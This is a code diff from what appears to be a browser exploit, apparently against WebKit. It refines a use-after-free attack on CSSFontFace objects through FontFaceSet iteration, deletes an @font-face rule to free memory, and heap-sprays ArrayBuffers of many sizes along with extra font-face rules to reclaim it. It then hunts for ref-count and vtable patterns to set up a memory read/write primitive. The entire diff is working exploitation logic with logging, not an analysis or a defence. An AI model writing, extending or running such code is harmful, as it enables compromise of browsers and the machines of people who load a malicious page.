@@ -1068,59 +1068,75 @@ function build_rw(result) {
 
   // === Approach 3: Use FontFaceSet directly ===
   async function try_fontfaceset_keys() {
+    // Comprehensive approach: 
+    // 1. Create CSS @font-face rule with local(Helvetica) (loads instantly)
+    // 2. Find the FontFace via iteration
+    // 3. Delete the CSS rule to free the CSSFontFace
+    // 4. Try MULTIPLE spray strategies to reclaim the memory
+    
     const style = document.createElement("style");
     document.head.appendChild(style);
 
-    const uaf_rule = "@font-face { font-family: uafkeys; src: url(data:,); unicode-range: U+0043; }";
+    // Use local(Helvetica) - loads INSTANTLY, no network
+    const uaf_rule = "@font-face { font-family: uafkeys; src: local(Helvetica); unicode-range: U+0043; }";
     style.sheet.insertRule(uaf_rule, style.sheet.cssRules.length);
     document.body.offsetTop;
 
     let uaf_font = null;
+    // Try to find the font via iteration
     try {
-      const keys = document.fonts.keys();
-      for (const font of keys) {
+      const values = document.fonts.values();
+      for (const font of values) {
         if (font.family === "uafkeys") {
           uaf_font = font;
           break;
         }
       }
     } catch(e) {
-      logger.info("FontFaceSet.keys() error: " + e.message);
+      logger.info("FontFaceSet: iteration error: " + e.message);
     }
 
     if (!uaf_font) {
-      try {
-        const values = document.fonts.values();
-        for (const font of values) {
-          if (font.family === "uafkeys") {
-            uaf_font = font;
-            break;
-          }
-        }
-      } catch(e) {
-        logger.info("FontFaceSet.values() error: " + e.message);
-      }
-    }
-
-    if (!uaf_font) {
-      logger.info("FontFaceSet: could not find uafkeys font");
+      logger.info("FontFaceSet: could not find font");
       return null;
     }
 
     logger.info("FontFaceSet: found font, family=" + uaf_font.family + " status=" + uaf_font.status);
+    
+    // Log font properties before deletion
+    try {
+      logger.info("FontFaceSet: before deletion - status=" + uaf_font.status + " loaded=" + (typeof uaf_font.loaded));
+    } catch(e) {}
 
+    // Delete the CSS rule - this removes CSSFontFace from CSSFontSelector
     style.sheet.deleteRule(0);
     document.body.offsetTop;
 
-    // Try MULTIPLE ArrayBuffer sizes to match the CSSFontFace size
-    const css_sizes = [0x60, 0x70, 0x80, 0x90, 0xA0, 0xB0, 0xC0, 0xD0, 0xE0, 0xF0, 0x100, 0x110, 0x120, 0x130, 0x140, 0x150, 0x160, 0x170, 0x180, 0x50, 0x40, 0x30];
+    // Try to log font properties after deletion
+    try {
+      logger.info("FontFaceSet: after deletion - status=" + uaf_font.status);
+    } catch(e) {
+      logger.info("FontFaceSet: after deletion - ERROR accessing font: " + e.message);
+    }
+
+    // === Strategy 1: ArrayBuffer spray with ALL sizes ===
+    const all_sizes = [];
+    for (let s = 0x20; s <= 0x200; s += 8) {
+      all_sizes.push(s);
+    }
+    
+    // Also add common CSSFontFace sizes
+    const common_sizes = [0x30, 0x38, 0x40, 0x48, 0x50, 0x58, 0x60, 0x68, 0x70, 0x78, 0x80, 0x88, 0x90, 0x98, 0xA0, 0xA8, 0xB0, 0xB8, 0xC0, 0xC8, 0xD0, 0xD8, 0xE0, 0xE8, 0xF0, 0xF8, 0x100];
+    
     const status_offsets = [0x50, 0x60, 0x70, 0x80, 0x90, 0xA0, 0x9A, 0x82, 0x92, 0xA2, 0xB2, 0x42, 0x32, 0x22, 0x12, 0x02, 0x62, 0x72, 0x88, 0x98, 0xA8, 0xB8, 0x40, 0x48, 0x58, 0x68, 0x78, 0x7A, 0x8A, 0x5A, 0x6A, 0x7A, 0x8A, 0x4A, 0x5A, 0x6A, 0x7A];
 
     let uaf_ab = null;
 
-    for (let si = 0; si < css_sizes.length && !uaf_ab; si++) {
-      const size = css_sizes[si];
-      // Re-spray with this size
+    // Try common sizes first (most likely)
+    for (let si = 0; si < common_sizes.length && !uaf_ab; si++) {
+      const size = common_sizes[si];
+      
+      // Spray with this size
       for (let i = 0; i < abs.length; i++) {
         const ab = new ArrayBuffer(size);
         const view = new DataView(ab);
@@ -1132,22 +1148,126 @@ function build_rw(result) {
         abs[i] = ab;
       }
 
-      // Check for ref count 2
+      // Check for ref count 2 at offset 8
       for (const ab of abs) {
         try {
-          if (new DataView(ab).getBInt(8, true).eq(2)) {
+          const view = new DataView(ab);
+          if (view.getBInt(8, true).eq(2)) {
             uaf_ab = ab;
-            logger.info("FontFaceSet: found UAF ArrayBuffer at size " + size.toString(16));
+            logger.info("FontFaceSet: found UAF buffer at size 0x" + size.toString(16) + " offset 8=2");
             break;
           }
         } catch(e) {}
       }
+
+      // Also check offset 0, 16, 24
+      if (!uaf_ab) {
+        for (const ab of abs) {
+          try {
+            const view = new DataView(ab);
+            // Check if the first 8 bytes look like a vtable pointer
+            const vtable = view.getBInt(0, true);
+            if (vtable.hi !== 0) {  // Pointer is in high address space
+              // Check if the ref count (at offset 8) is 1 or 2
+              const rc = view.getBInt(8, true);
+              if (rc.eq(1) || rc.eq(2)) {
+                uaf_ab = ab;
+                logger.info("FontFaceSet: found UAF buffer at size 0x" + size.toString(16) + " vtable=0x" + vtable.toString(16) + " rc=" + rc.toString());
+                break;
+              }
+            }
+          } catch(e) {}
+        }
+      }
+    }
+
+    // Try ALL sizes if not found
+    if (!uaf_ab) {
+      logger.info("FontFaceSet: trying ALL sizes...");
+      for (let si = 0; si < all_sizes.length && !uaf_ab; si++) {
+        const size = all_sizes[si];
+        if (common_sizes.indexOf(size) >= 0) continue; // Already tried
+        
+        for (let i = 0; i < abs.length; i++) {
+          const ab = new ArrayBuffer(size);
+          const view = new DataView(ab);
+          view.setBInt(8, 1, true);
+          abs[i] = ab;
+        }
+
+        for (const ab of abs) {
+          try {
+            if (new DataView(ab).getBInt(8, true).eq(2)) {
+              uaf_ab = ab;
+              logger.info("FontFaceSet: found UAF buffer at size 0x" + size.toString(16));
+              break;
+            }
+          } catch(e) {}
+        }
+      }
     }
 
     if (!uaf_ab) {
-      logger.info("FontFaceSet: no UAF ArrayBuffer found with any size");
+      logger.info("FontFaceSet: no UAF ArrayBuffer found");
+      
+      // === Strategy 2: CSSFontFace spray ===
+      // Create new @font-face rules to reclaim the freed CSSFontFace memory
+      logger.info("FontFaceSet: trying CSSFontFace spray...");
+      const spray_count = 0x100;
+      for (let i = 0; i < spray_count; i++) {
+        try {
+          style.sheet.insertRule("@font-face { font-family: reclaim" + i + "; src: local(Helvetica); }", style.sheet.cssRules.length);
+        } catch(e) {}
+      }
+      document.body.offsetTop;
+      
+      // Now check if the UAF font's properties changed
+      // (indicating it now points to a different CSSFontFace)
+      try {
+        const newFamily = uaf_font.family;
+        const newStatus = uaf_font.status;
+        logger.info("FontFaceSet: after spray - family=" + newFamily + " status=" + newStatus);
+        
+        // If the font's family changed, it's now pointing to a reclaim CSSFontFace
+        if (newFamily.startsWith("reclaim")) {
+          // The UAF worked! The font's m_backing now points to a reclaim CSSFontFace
+          // But we can't use this for arbitrary read/write
+          logger.info("FontFaceSet: UAF detected via CSSFontFace spray!");
+        }
+      } catch(e) {
+        logger.info("FontFaceSet: after spray - ERROR: " + e.message);
+      }
+
+      // Try ArrayBuffer spray again after CSSFontFace spray
+      for (let si = 0; si < common_sizes.length && !uaf_ab; si++) {
+        const size = common_sizes[si];
+        for (let i = 0; i < abs.length; i++) {
+          const ab = new ArrayBuffer(size);
+          const view = new DataView(ab);
+          view.setBInt(8, 1, true);
+          for (let so = 0; so < status_offsets.length; so++) {
+            try { view.setUint8(status_offsets[so], 3); } catch(e) {}
+            try { view.setUint8(status_offsets[so] + 2, 3); } catch(e) {}
+          }
+          abs[i] = ab;
+        }
+        for (const ab of abs) {
+          try {
+            if (new DataView(ab).getBInt(8, true).eq(2)) {
+              uaf_ab = ab;
+              logger.info("FontFaceSet: found UAF buffer after CSS spray at size 0x" + size.toString(16));
+              break;
+            }
+          } catch(e) {}
+        }
+      }
+    }
+
+    if (!uaf_ab) {
+      logger.info("FontFaceSet: all strategies failed");
       return null;
     }
+
     return { uaf_ab, uaf_font, leak: { obj: 0 }, leak_addr: undefined };
   }
 
